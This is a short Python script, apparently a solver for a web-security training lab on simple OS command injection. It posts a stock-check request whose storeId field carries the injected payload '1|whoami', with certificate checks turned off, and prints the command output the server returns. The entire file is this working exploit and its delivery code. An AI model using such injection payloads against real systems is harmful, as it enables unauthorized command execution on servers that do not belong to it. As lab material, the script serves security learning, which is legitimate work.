import requests
import urllib3
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "OS command injection, simple case"

def run(url, payload, proxies=None):
    payload = "1|whoami"
    data = { "productId": "2", "storeId": payload }

    try:
        r = requests.post(f"{url.rstrip('/')}/product/stock", data, verify=False, proxies=proxies)
        res = r.text
        print(Fore.GREEN + "whoami" + Fore.WHITE + " => " + Fore.YELLOW + res)
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False